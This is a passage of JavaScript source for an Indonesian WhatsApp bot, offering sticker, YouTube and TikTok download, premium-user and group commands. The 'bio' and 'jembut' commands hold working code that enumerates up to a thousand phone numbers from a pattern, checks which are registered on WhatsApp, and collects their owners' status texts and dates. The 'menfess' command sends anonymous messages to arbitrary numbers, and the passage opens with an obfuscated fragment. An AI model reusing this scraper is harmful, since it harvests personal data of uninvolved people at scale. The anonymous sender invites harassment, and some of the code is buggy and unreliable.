_0x1264b0;};return _0x4136();}for(var i in result){msg+=_0x44a930(0x99)+i+_0x363640(0x8c)+result[i][_0x363640(0x8e)](_0x4cddcc=>_0x363640(0xac)+_0x4cddcc[_0x363640(0x9f)]+_0x44a930(0x91)+_0x4cddcc[_0x363640(0x91)]+_0x363640(0xa8)+_0x4cddcc[_0x363640(0x90)]+'_')[_0x363640(0xa0)]('\x0a\x0a')+'\x0a\x0a';}function _0x143a(_0x3799ab,_0x36f2d5){var _0xffa77=_0x4491();return _0x143a=function(_0x3a5d11,_0x444a5f){_0x3a5d11=_0x3a5d11-0x88;var _0x5de52f=_0xffa77[_0x3a5d11];return _0x5de52f;},_0x143a(_0x3799ab,_0x36f2d5);}let send=_0x363640(0x9c)+msg+_0x363640(0xab)+'_'+noton[_0x44a930(0x95)](_0x42316c(0x1b2))+'_';await message[_0x363640(0x9d)](send);
}
break


case 'bio':
	if (args.length < 1) return m.reply(`Contoh Penggunaan : \n${prefix + command} 62838340270xx`)
	var teks = args[0]
	if (!teks.includes('x')) return m.reply('stres')
	conn.sendMessage(from, { react: { text: `🕐`, key: m.key }})
	function countInstances(string, word) {
	  return string.split(word).length - 1;
	}
	var nomer0 = teks.split('x')[0]
	var nomer1 = teks.split('x')[countInstances(teks, 'x')] ? teks.split('x')[countInstances(teks, 'x')] : ''
	var random_length = countInstances(teks, 'x')
var k = 1
	var random;
	if (random_length == 1) {
	  random = 10
	} else if (random_length == 2) {
	  random = 100
	} else if (random_length == 3) {
	  random = 1000
	}

	var nomerny = `-- List Nomer --\n\n`
	var nomerny1 = `<2009>\n\n`
	var nomerny2 = `<2010>\n\n`
	var nomerny3 = `<2011>\n\n`
	var nomerny4 = `<2012>\n\n`
	var nomerny5 = `<2013>\n\n`
	var nomerny6 = `<2014>\n\n`
	var nomerny7 = `<2015>\n\n`
	var nomerny8 = `<2016>\n\n`
	var nomerny9 = `<2017>\n\n`
	var nomerny10 = `<2018>\n\n`
	var nomerny11 = `<2019>\n\n`
	var nomerny12 = `<2020>\n\n`
	var no_bio = `\nnot Bio || \nHey there! I am using WhatsApp.\n`
	var no_watsap = `\nNot  registered \n`

	for (let i = 0; i < random; i++) {
	  var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
	  var dom1 = nu[Math.floor(Math.random() * nu.length)]
	  var dom2 = nu[Math.floor(Math.random() * nu.length)]
	  var dom3 = nu[Math.floor(Math.random() * nu.length)]
	  var dom4 = nu[Math.floor(Math.random() * nu.length)]

	  var rndm;
	  if (random_length == 1) {
		rndm = `${dom1}`
	  } else if (random_length == 2) {
		rndm = `${dom1}${dom2}`
	  } else if (random_length == 3) {
		rndm = `${dom1}${dom2}${dom3}`
	  } else if (random_length == 4) {
		rndm = `${dom1}${dom2}${dom3}${dom4}`
	  }

	  var anu = await conn.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
	  var anuu = anu.length !== 0 ? anu : false

	  try {
		try {
		  var anu1 = await conn.fetchStatus(anu[0].jid)
		} catch {
		  var anu1 = '401'
		}
		if (anu1 == '401' || anu1.status.length == 0) {
		  no_bio += `${i} wa.me/${anu[0].jid.split("@")[0]}\n`
		  console.log(`-${i}) ${nomer0}${i}${nomer1}`, color(` [NO BIO]`, 'green'))
		} else {
		 var tahuns = moment(anu1.setAt).tz('Asia/Jakarta').format('ddd DD MMM YYYY')
		 var inc = ["2009"]
		 if (inc.includes(tahuns.split(' ')[3])) {
		  nomerny1 += `Num : +${anu[0].jid.split("@")[0]}\nAbout : ${anu1.status}\nDate : ${tahuns}\n\n`
		  console.log(`-${i}) ${nomer0}${i}${nomer1}`, color(` [BIO 2009]`, 'green'))
		}
		
	 }
	  } catch {
		no_watsap += `${nomer0}${i}${nomer1}\n`
		console.log(`-${i}) ${nomer0}${i}${nomer1}`, color(` [NOT REGISTERED]`, 'red'))
	  }

	  var tahuns = moment(anu1.setAt).tz('Asia/Jakarta').format('ddd DD MMM YYYY')
	  var incc = ["2010"]
	  if (incc.includes(tahuns.split(' ')[3])) {
	   nomerny2 += `Num : +${anu[0].jid.split("@")[0]}\nAbout : ${anu1.status}\nDate : ${tahuns}\n\n`
	   console.log(`-${i}) ${nomer0}${i}${nomer1}`, color(` [BIO 2010]`, 'green'))
	 }

	 var tahuns = moment(anu1.setAt).tz('Asia/Jakarta').format('ddd DD MMM YYYY')
	 var inccc = ["2011"]
	 if (inccc.includes(tahuns.split(' ')[3])) {
	  nomerny3 += `Num : +${anu[0].jid.split("@")[0]}\nAbout : ${anu1.status}\nDate : ${tahuns}\n\n`
	  console.log(`-${i}) ${nomer0}${i}${nomer1}`, color(` [BIO 2011]`, 'green'))
	}

	var tahuns = moment(anu1.setAt).tz('Asia/Jakarta').format('ddd DD MMM YYYY')
	var incccc = ["2012"]
	if (incccc.includes(tahuns.split(' ')[3])) {
	 nomerny4 += `Num : +${anu[0].jid.split("@")[0]}\nAbout : ${anu1.status}\nDate : ${tahuns}\n\n`
	 console.log(`-${i}) ${nomer0}${i}${nomer1}`, color(` [BIO 2012]`, 'green'))
   }

   var tahuns = moment(anu1.setAt).tz('Asia/Jakarta').format('ddd DD MMM YYYY')
   var inccccc = ["2013"]
   if (inccccc.includes(tahuns.split(' ')[3])) {
	nomerny5 += `Num : +${anu[0].jid.split("@")[0]}\nAbout : ${anu1.status}\nDate : ${tahuns}\n\n`
	console.log(`-${i}) ${nomer0}${i}${nomer1}`, color(` [BIO 2013]`, 'green'))
  }

  var tahuns = moment(anu1.setAt).tz('Asia/Jakarta').format('ddd DD MMM YYYY')
  var incccccc = ["2014"]
  if (incccccc.includes(tahuns.split(' ')[3])) {
   nomerny6 += `Num : +${anu[0].jid.split("@")[0]}\nAbout : ${anu1.status}\nDate : ${tahuns}\n\n`
   console.log(`-${i}) ${nomer0}${i}${nomer1}`, color(` [BIO 2014]`, 'green'))
 }

 var tahuns = moment(anu1.setAt).tz('Asia/Jakarta').format('ddd DD MMM YYYY')
 var inccccccc = ["2015"]
 if (inccccccc.includes(tahuns.split(' ')[3])) {
  nomerny7 += `Num : +${anu[0].jid.split("@")[0]}\nAbout : ${anu1.status}\nDate : ${tahuns}\n\n`
  console.log(`-${i}) ${nomer0}${i}${nomer1}`, color(` [BIO 2015]`, 'green'))
}

var tahuns = moment(anu1.setAt).tz('Asia/Jakarta').format('ddd DD MMM YYYY')
var incccccccc = ["2016"]
if (incccccccc.includes(tahuns.split(' ')[3])) {
 nomerny8 += `Num : +${anu[0].jid.split("@")[0]}\nAbout : ${anu1.status}\nDate : ${tahuns}\n\n`
 console.log(`-${i}) ${nomer0}${i}${nomer1}`, color(` [BIO 2016]`, 'green'))
}

	}
	m.reply(`${nomerny}${nomerny1}${nomerny2}${nomerny3}${nomerny4}${nomerny5}${nomerny6}${nomerny7}${nomerny8}`)
	break



						case 'jembut':
                   if (args.length < 1) return m.reply(`send order ${command} with Caption ${prefix + command} 628172727xx`)
                   var teks = args[0]
                   if (!teks.includes('x')) return m.reply('lah?')
				   conn.sendMessage(from, { react: { text: `🕐`, key: m.key }})
                   function countInstances(string, word) {
                     return string.split(word).length - 1;
                   }
                   var nomer0 = teks.split('x')[0]
                   var nomer1 = teks.split('x')[countInstances(teks, 'x')] ? teks.split('x')[countInstances(teks, 'x')] : ''
                   var random_length = countInstances(teks, 'x')
var k = 1
                   var random;
                   if (random_length == 1) {
                     random = 10
                   } else if (random_length == 2) {
                     random = 100
                   } else if (random_length == 3) {
                     random = 1000
                   }

                   var nomerny = `-- List Nomer --\n\n`
                   var no_bio = `\nnot Bio || \nHey there! I am using WhatsApp.\n`
                   var no_watsap = `\nNot  registered \n`

                   for (let i = 0; i < random; i++) {
                     var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
                     var dom1 = nu[Math.floor(Math.random() * nu.length)]
                     var dom2 = nu[Math.floor(Math.random() * nu.length)]
                     var dom3 = nu[Math.floor(Math.random() * nu.length)]
                     var dom4 = nu[Math.floor(Math.random() * nu.length)]

                     var rndm;
                     if (random_length == 1) {
                       rndm = `${dom1}`
                     } else if (random_length == 2) {
                       rndm = `${dom1}${dom2}`
                     } else if (random_length == 3) {
                       rndm = `${dom1}${dom2}${dom3}`
                     } else if (random_length == 4) {
                       rndm = `${dom1}${dom2}${dom3}${dom4}`
                     }

                     var anu = await conn.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
                     var anuu = anu.length !== 0 ? anu : false

                     try {
                       try {
                         var anu1 = await conn.fetchStatus(anu[0].jid)
                       } catch {
                         var anu1 = '401'
                       }
                       if (anu1 == '401' || anu1.status.length == 0) {
                         no_bio += `${i} wa.me/${anu[0].jid.split("@")[0]}\n`
                         console.log(`-${i}) ${nomer0}${i}${nomer1}`, color(` [REGISTERED]`, 'green'))
                       } else {
						var tahuns = moment(anu1.setAt).tz('Asia/Jakarta').format('ddd DD MMM YYYY')
						var inc = ["2009","2010","2011","2012","2013","2014","2015","2016"]
						if (inc.includes(tahuns.split(' ')[3])) {
                         nomerny += `${k++}.\nNum : +${anu[0].jid.split("@")[0]}\nWa : wa.me/${anu[0].jid.split("@")[0]}\nAbout : ${anu1.status}\nDate : ${tahuns}\n\n`
                         console.log(`-${i}) ${nomer0}${i}${nomer1}`, color(` [REGISTERED]`, 'green'))
                       }
					}
                     } catch {
                       no_watsap += `${nomer0}${i}${nomer1}\n`
                       console.log(`-${i}) ${nomer0}${i}${nomer1}`, color(` [NOT REGISTERED]`, 'red'))
                     }
                   }
                   m.reply(`\`\`\`${nomerny}\`\`\``)
                   break
	
			case 'addprem':
				if (!isCreator) return m.reply(act.owner)
				{ q, args } {
				if (args.length < 2)
				return m.reply(
				`Penggunaan :\n*#addprem* @tag waktu\n*#addprem* nomor waktu\n\nContoh : #addprem @tag 30d`
				);
				if (m.mentionedJid.length !== 0) {
				for (let i = 0; i < m.mentionedJid.length; i++) {
				prem.addPremiumUser(m.mentionedJid[0], args[1], premium);
						}
				m.reply("Sukses");
					} else {
				prem.addPremiumUser(args[0] + "@s.whatsapp.net", args[1], premium);
				m.reply("Sukses via nomor");
						}
					}
				break
case 'spb': case 'spbot': case 'setppfull': {
                    if (!isCreator) return m.reply('ga mau')
                    var media = await conn.downloadAndSaveMediaMessage(quoted)
                    try {
               //     const { generateProfilePicture } = require("./lib/myfunc")
                    var { img } = await generateProfilePicture(media)
                    await conn.query({ tag: 'iq',attrs: { to: botNumber, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})
                    m.reply(`Sukses`)
                    } catch { m.reply('Gagal Mengganti Photo Profile') }
                    }
                    break
	case 'spgc': case 'setppgcfull': {
		if (!m.isGroup) return m.reply(act.gc)
		if (!isBotAdmins) return m.reply(act.botadm)
		if (!isAdmins) return m.reply(act.admin)
                if (!quoted) return m.reply(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return m.reply(`Send/Reply Image With Caption ${prefix + command}`)
                if (/webp/.test(mime)) return m.reply(`Send/Reply Image With Caption ${prefix + command}`)
                var media = await conn.downloadAndSaveMediaMessage(quoted)
            let gc = m.chat
            var { img } = await generateProfilePicture(media)
            await conn.query({
            tag: 'iq',
            attrs: {
            to: gc,
            type:'set',
            xmlns: 'w:profile:picture'
            },
            content: [
            {
            tag: 'picture',
            attrs: { type: 'image' },
            content: img
            }
            ]
            })
            m.reply(`Sukses`)
}
                break
			case 'delprem':
				if (!isCreator) return m.reply(act.owner)
				{ q, args, arg } {
				if (args.length < 1) return m.reply(`Penggunaan :\n*#delprem* @tag\n*#delprem* nomor`);
				if (m.mentionedJid.length !== 0) {
					for (let i = 0; i < m.mentionedJid.length; i++) {
						premium.splice(prem.getPremiumPosition(m.mentionedJid[i], premium), 1);
						fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
					}
					m.reply("Sukses");
				} else {
				premium.splice(prem.getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1);
				fs.writeFileSync("./database/premium.json", JSON.stringify(premium));
				m.reply("sukses via nomor");
				}
				}
				break
			case 'tes':{
				//if (!isPremium) return m.reply('premium only')
				m.reply('affah iyh')
				}
				break
			case 'join': {
                if (!isPremium) return m.reply('premium only')
                if (!text) return m.reply('Masukkan Link Group!')
                if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return m.reply('Link Invalid!')
                m.reply('wait bg...')
                let result = args[0].split('https://chat.whatsapp.com/')[1]
                await conn.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
        	    }
           	 break
			case 'leave': {
                if (!isCreator) return m.reply(act.owner)
                await conn.groupLeave(from).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                console.log()
            	}
             break
			case 'setsponsor':
			case 'setiklan':
				if (!isCreator) return m.reply(act.owner)
				if (args.length < 1) return m.reply('text nya mana')
				let intex = q.split('|')[0] ? q.split('|')[0]: q
				let expr = q.split('|')[1] ? q.split('|')[1]: ''
				exo = Date.now() + toMs(expr)
				newvalue = {
  				setting: intex,
  				expired: exo
				}
				oldvalue = jsn[0].setting
				let position = false
				Object.keys(jsn).forEach((i) => {
  				if (jsn[i].setting === oldvalue) {
    				position = i
  				}
				})
				if (position !== false) {
  				jsn[position] = newvalue
  				fs.writeFileSync('./src/database.json', JSON.stringify(jsn))
				}
				m.reply(`Iklan sukses diganti menjadi : *${jsn[0].setting}*`)
				
				case 'owner':{
					btn = [{
						urlButton: {
							displayText: '👤 ᴏᴡɴᴇʀ',
							url: 'https://wa.me/687909979'
						}
					}]

		conn.send5ButMsg(from, `\nHalo kak ${pushname} Ini Adalah Nomer Owner Ku\n`, `Tekan Button Dibawah!`, btn)
				}
					break
	/*	
case 'owner':
case 'creator': {
sections = [
                {
                title: `Hai ${pushname} 👋`,
                rows: [
                {title: "Biodata", rowId: `.biodatacookxkvz`, description: `Menampilkan Biodata Owner`},
                {title: "Nomor", rowId: `.nmrownxnjayxz`, description: `Menampilkan Nomor Owner`},
                {title: "Sewabot", rowId: `.cuihhxdn`, description: `Sewabott Murah`},
                {title: "Script Bot", rowId: `.dldxil`, description: `Menampilkan Script Bot`}
                ]
                },
                ]
conn.sendListMsg(from, `Silahkan click tombol dibawah ini`, `© 2022 Fadhil Graphy`, `Hai ${pushname} 👋`, `Click Here`, sections, fake)
      }
break
case 'nmrownxnjayxz': { // yg lain yg ada button owner ganti ke ini biar langsung ke contact
// follow https://github.com/Chandra-XD
cok = {key: { fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "status@broadcast" })}, message: { 'contactMessage': { 'displayName': `Crizzy Bot`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Crizzy Bot,;;;\nFN:Crizzy Bot,\nitem1.TEL;waid=0:0\nitem1.X-ABLabell:Ponsel\nEND:VCARD`} }}
conn.sendContact(from, global.owner, cok)
}
break
// add by Chandra XD
// follow https://github.com/Chandra-XD
case 'biodatacookxkvz': {
nduwur = `┍┈–––• *BIODATA OWNER*
┆⫹⫺ Nama : -
┆⫹⫺ Hobby : -
┆⫹⫺ Status : -
┆⫹⫺ Birthday : -
┆⫹⫺ Address : -
┆⫹⫺ Hobby : -
└––––––––––––––––––·•

┍┈––––––• *SKILLS*
┆> JavaScript [-%]
┆> Html [-%]
┆> CSS [-%]
└––––––––––––––––––·•\n`
ngisor = `Social Media :
YouTube : -
Instragram : -
TikTok : -
Github : -
Email : -
Whatsapp : -` // tambahin sendiri anjeng
btnm = [{buttonId: `nmrownxnjayxz`, buttonText: {displayText: 'Owner Number'}, type: 1}]
for (let i of profilebio) {
try {
ppne = await conn.profilePictureUrl(i + "@s.whatsapp.net", 'image')
} catch {
ppne = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
conn.sendMessage(from, { caption: nduwur, image: { url: ppne }, buttons: btnm, footer: ngisor })
}
}
break */
			case 'nulis':
				if(args.length < 1) return m.reply('text nya')
				m.reply(act.proc)
				await conn.sendMessage(from,{image:{url:`https://api.zekais.com/bukukanan?text=${body.slice(6)}&apikey=zekais`},caption:act.done},{quote:m}).catch((e) => m.reply(e))
				break
			case 'sticker': case 's': case 'stickergif': case 'sgif': {
        	   if (/image/.test(mime)) {
        	   m.reply(act.proc)
              	  let media = await conn.downloadMediaMessage(qmsg)
				    const json = { "sticker-pack-id": "meta-avatar", "sticker-pack-name": global.packname, "sticker-pack-publisher": global.author, "emojis": global.categories ? global.categories : [""] }
            	    let encmedia = await conn.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author })
             	   await fs.unlinkSync(encmedia)
         	   } else if (/video/.test(mime)) {
        	    m.reply(act.proc)
        	        if (qmsg.seconds > 11) return m.reply('Maksimal 10 detik!')
             	   let media = await conn.downloadMediaMessage(qmsg)
             	   let encmedia = await conn.sendVideoAsSticker(from, media, m, { packname: global.packname, author: global.author })
        	        await fs.unlinkSync(encmedia)
      	      } else {
       	         m.reply(`Kirim/reply gambar/video/gif dengan caption ${prefix + command}\nDurasi Video/Gif 1-9 Detik`)
       	         }
        	    }
        	    break
				
			case 'stickerwm':
			case 'swm':
			case 'stickergifwm':
			case 'sgifwm': {
                let [teks1, teks2] = text.split`|`
                if (!teks1) return m.reply(`Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`)
                if (!teks2) return m.reply(`Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`)
            	m.reply(act.proc)
                if (/image/.test(mime)) {
                    let media = await conn.downloadMediaMessage(qmsg)
                    let encmedia = await conn.sendImageAsSticker(from, media, m, { packname: teks1, author: teks2 })
                    await fs.unlinkSync(encmedia)
                } else if (/video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
                    let media = await conn.downloadMediaMessage(qmsg)
                    let encmedia = await conn.sendVideoAsSticker(from, media, m, { packname: teks1, author: teks2 })
                    await fs.unlinkSync(encmedia)
                /*} else if (/document/.test(mime)) {
                    let media = await conn.downloadMediaMessage(qmsg)
                    let encmedia = await conn.sendImageAsSticker(from, media, m, { packname: teks1, author: teks2 })
                    await fs.unlinkSync(encmedia)*/
                } else {
                    m.reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
                }
        	    }
        	    break
			case 'toimage': case 'toimg': {
                if (!/webp/.test(mime)) return m.reply(`Reply sticker dengan caption *${prefix + command}*`)
                m.reply('Wait bang...')
                let media = await conn.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return m.reply(err)
                    let buffer = fs.readFileSync(ran)
                    conn.sendMessage(from, { image: buffer }, { quoted: m })
                    fs.unlinkSync(ran)
                })
       	     }
     	       break
			case 'play':
			case 'ytplay': {
                if (!text) return m.reply(`Example : ${prefix + command} story wa anime`)
                m.reply(act.wait)
                let yts = require("yt-search")
                let search = await yts(text)
                let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
                let buttons = [
                	{ urlButton: { displayText: `𝐒𝐮𝐩𝐩𝐨𝐫𝐭 𝐔𝐬!`, url : `https://instagram.com/uidoajwn` } },
                    { quickReplyButton: { displayText: `𝐀𝐮𝐝𝐢𝐨`, id: `ytmp3 ${anu.url}` } },
                    { quickReplyButton: { displayText: `𝐕𝐢𝐝𝐞𝐨`, id: `ytmp4 ${anu.url}` } }
                ]
                let buttonMessage = {
                    image : { url: anu.thumbnail },
                    caption : `YOUTUBE PLAY`,
                    footer : `⊳ Title : ${anu.title}
⊳ Ext : Search
⊳ ID : ${anu.videoId}
⊳ Duration : ${anu.timestamp}
⊳ Viewers : ${anu.views}
⊳ Upload At : ${anu.ago}
⊳ Author : ${anu.author.name}
⊳ Channel : ${anu.author.url}
⊳ Description : ${anu.description}
⊳ Url : ${anu.url}`,
                    templateButtons: buttons,
                    headerType: 4
                }
                conn.sendMessage(from, buttonMessage, { quoted: m })
                console.log(anu)
      	      }
      	      break
			case 'yts':
			case 'ytsearch': {
                if (!text) m.reply(`Example : ${prefix + command} story wa anime`)
                m.reply("Please wait... data is being processed!")
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
				var list = []

                let no = 1
                for (let i of search.all) {
                	list.push({

				title: `*${no++} ${i.title}*`, rowId: `dariytskunci ${i.url}`, description: `\n\n▢ Judul : ${i.title}\n▢ ID : ${i.videoId}\n▢ Channel : ${i.author.name}\n▢ Upload : ${i.ago}\n▢ Ditonton : ${i.views}\n▢ Duration : ${i.timestamp}\n▢ URL : ${i.url}`})

				}

				var sections = [{title: `Hallo *${pushname}* 👋 Silahkan pilih dibawah ini`, rows:list}]

				var listms = { text: `*YOUTUBE SEARCH*\n\nBerhasil Menemukan Data\nHasil Pencarian : ${q}\nSilahkan Pilih Dibawah Ini`, footer: `Id : Jangan lupa donasi untuk suport bot yaa\nEn : don't forget to donate to support bots\n\n© 2022 Fadhil Graphy`, buttonText: "Click Here", sections }

				conn.sendMessage(from, listms, m)

               }
          	  break
			case 'dariytskunci':{ //KUNCI = BIAR GA DR AKSES HEHE
				let { yta } = require('./lib/y2mate')
                if (!text) m.reply(`Example : ${prefix + command} blabla`)
                let quality = args[1] ? args[1] : '128kbps'
                let resmed = await yta(text, quality)
                if (resmed.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(resmed))
                btnYts = [
                    { urlButton: { displayText: `𝐒𝐮𝐩𝐩𝐨𝐫𝐭 𝐔𝐬!`, url : `https://instagram.com/uidoajwn` } },
                    { quickReplyButton: { displayText: `𝐀𝐮𝐝𝐢𝐨`, id: `resaudkunci ${q}` } },
                    { quickReplyButton: { displayText: `𝐕𝐢𝐝𝐞𝐨`, id: `resvidkunci ${q}` } }
                ]
                conn.sendMessage(from, { caption: `⭔ Title : ${resmed.title}\n⭔ File Size : ${resmed.filesizeF}\n⭔ Url : ${isUrl(text)}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '128kbps'}`, image: {url: resmed.thumb}, templateButtons: btnYts, footer: `© 2022 fdhlgrphy.com` })
				}
				break
			case 'resaudkunci': { //KUNCI = BIAR GA DIAKSES HEHE
				let { yta } = require('./lib/y2mate')
                if (!text) m.reply(`Example : ${prefix + command} dhdh`)
                let quality = args[1] ? args[1] : '128kbps'
                let medd = await yta(text, quality)
                if (medd.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(medd))
                conn.sendMessage(from, { audio: { url: medd.dl_link }, mimetype: 'audio/mpeg', fileName: `${medd.title}.mp3` }, { quoted: m })
                }
                break
			case 'resvidkunci': { //KUNCI = BIAR GA DIAKSES HEHE
				let { ytv } = require('./lib/y2mate')
                if (!text) m.reply(`Example : ${prefix + command} https://youtube.com/ 360p`)
                let quality = args[1] ? args[1] : '360p'
                let media = await ytv(text, quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                conn.sendMessage(from, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${isUrl(text)}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
                }
                break
			case 'ytmp3':
			case 'ytaudio': {
                let { yta } = require('./lib/y2mate')
                if (!text) return m.reply(`Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`)
                let quality = args[1] ? args[1] : '128kbps'
                let media = await yta(text, quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                conn.sendMessage(from, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
       	     }
        	    break
            case 'ytmp4':
			case 'ytvideo': {
                let { ytv } = require('./lib/y2mate')
                if (!text) return m.reply(`Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`)
                let quality = args[1] ? args[1] : '360p'
                let media = await ytv(text, quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                conn.sendMessage(from, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${isUrl(text)}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
        	    }
        	    break
			case 'menfess':
			case 'menfes':
			case 'confes':
			case 'confess':
				if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
				if (!text) return m.reply(`*Cara Penggunaan*\n\nKirim perintah ${prefix}${command} nomer|pengirim|pesan\n\nContoh ${prefix}${command} 62831xxxxxxx|ini nama samaran ya|I have a crush on you\n\nContoh 2 : ${prefix}${command} 62831xxxxxxx|crush mu|I have s crush on you\n\nTenang aja privasi aman kok><`)
				let nomor = q.split('|')[0] ? q.split('|')[0] : q
				let saking = q.split('|')[1] ? q.split('|')[1] : q
				let pesan = q.split('|')[2] ? q.split('|')[2] : ''
				if (pesan.length < 1) return m.reply(`Harus di isi semua! ex : menfess 62831xxxxxxxx|orang|hallo kamu`)
				 let teksnya = `Hai kak ada Menfess nih!!\n─────────────\n*Crizzy-Bot*\n─────────────\n\nDari : _${saking}_ \nPesan : _${pesan}_ `
				header = 'hayyy'
					gambar = `https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRMkjAJhYezm4h6k1AJ6qfreGkaRdBcR7UHMw&usqp=CAU`

				 but = [
					{ urlButton: { displayText: `𝐒𝐮𝐩𝐩𝐨𝐫𝐭 𝐔𝐬!`, url : `https://instagram.com/uidoajwn` } },
                    { quickReplyButton: { displayText: `𝐓𝐞𝐫𝐢𝐦𝐚 𝐌𝐞𝐧𝐟𝐞𝐬𝐬`, id: `menfesconfirm ${m.sender}` } },
                    { quickReplyButton: { displayText: `𝐊𝐢𝐫𝐢𝐦 𝐌𝐞𝐧𝐟𝐞𝐬𝐬𝐦𝐮`, id: `Menfess` } }
                		]
					conn.sendMessage(`${nomor}@s.whatsapp.net`, { caption: teksnya, image: {url: `https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRMkjAJhYezm4h6k1AJ6qfreGkaRdBcR7UHMw&usqp=CAU`}, templateButtons: but, footer: `Ciee ada yang ngirim pesan nih\n© 2022 fdhlgrphy.com` })
				m.reply(`Sukses Mengirim Menfess!!`)
				break

			case 'menfesconfirm':
 				 conn.sendMessage(q, {text: `Sudah Di Confirmasi Nih Menfess nyaa🤭`})
				  m.reply(`Terimakasih Menfess Telah Diterima.`)
				break
			case 'tiktoknowm':
			case 'tiktok':
			case 'tt':
			    if (!text) return m.reply('masukkan link nya')
				let p = await fdl.downloader.tiktok(q)
				let nih = `*[ TIKTOK DOWNLOADER ]*

📌 *Title:* ${p.title}
👤 *Author:* ${p.author}	`
				let buttons = [
                    {buttonId: `tiktokmp3 ${text}`, buttonText: {displayText: '♫ Audio'}, type: 1}
                ]
                let buttonMessage = {
                    video: { url: p.nowm },
                    caption: nih,
                    title: 'TIKTOK DOWNLOADER',
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 5
                }
                conn.sendMessage(from, buttonMessage, { quoted: m })
            
			    break
			case 'tiktokmp3': 
			case 'tiktokaudio': {
				if (!text) return m.reply('masukkan link nya')
				let aud = await fdl.downloader.tiktok(text)
				let cap = `*[ TIKTOK AUDIO ]*

📌 *Title:* ${aud.title}
👤 *Author:* ${aud.author}	`
				conn.sendMessage(from, { caption: cap, image: {url: aud.thumbnail}})
				conn.sendMessage(from, { audio: { url: aud.audio }, mimetype: 'audio/mpeg'}, { quoted: m })
				}
				break
			/*case 'topup': {
				if (args.length < 1) return m.reply(`Link atau Usernamenya mana?`)
				let nyobb = [{
  				title: "Game Store",
  				rows: [
							{title: `*Free Fire 5 Diamond*`,rowId: `epep ${q}|5`, description: `\nTop up diamond free fire 5`},
							{title: `*Free Fire 12 Diamond*`,rowId: `epep ${q}|12`, description: `\nTop up diamond free fire 12`},
							{title: `*Free Fire 70 Diamond*`,rowId: `epep ${q}|70`, description: `\nTop up diamond free fire 70`},
							{title: `*Free Fire 140 Diamond`,rowId: `epep ${q}|140`, description: `\nTop up diamond free fire 140`},
							{title: `*Free Fire 355 Diamond`,rowId: `epep ${q}|355`, description: `\nTop up diamond free fire 355`},
							{title: `*Free Fire 720 Diamond`,rowId: `epep ${q}|720`, description: `\nTop up diamond free fire 720`}
				]},
				]
				conn.sendListMsg(from, `Pilih layanan sesuai dengan yang ingin anda beli!\njika anda membeli followers maka pilih followers\ndiharapkan anda sudah faham.`, `© 2022\nFadhil Graphy (owner bot)\nAffis Junianto (owner smm)`, `Hallo, Berikut layanan kami`, `Click Here`, nyobb, m)
				}
				break
          	case 'epep':
          //async function topupFreeFire() {
          	let idtar = q.split('|')[0] ? q.split('|')[0]: q
				let jumjum = q.split('|')[1] ? q.split('|')[1]: ''
				if (jumjum.length < 1) return m.reply(`Jumlah dan Target harus di isi!`)
const makeSession = await hikki.game.topupFreeFire(`${idtar}`, `${jumjum}`) // support nominal 5 12 70 140 355 720'
 //console.log(makeSession) //if get more property
buto = [{
    				buttonId: `cekstatus`,
    				buttonText: {
      				displayText: 'Check Status'
    				},
    				type: 1
  				}]
conn.sendMessage(from, {
    				caption: `bayar\ntime : ${makeSession.data.timerCount}`, image: {
      				url: makeSession.data.qrCode
    				}
  				})
// const paydm = hikki.game.payDiamond(makeSession, '08953225697662')
console.log(paydm)
//topupFreeFire().then(console.log).catch(console.error)
//}
break*/
			case'create': case 'sf':
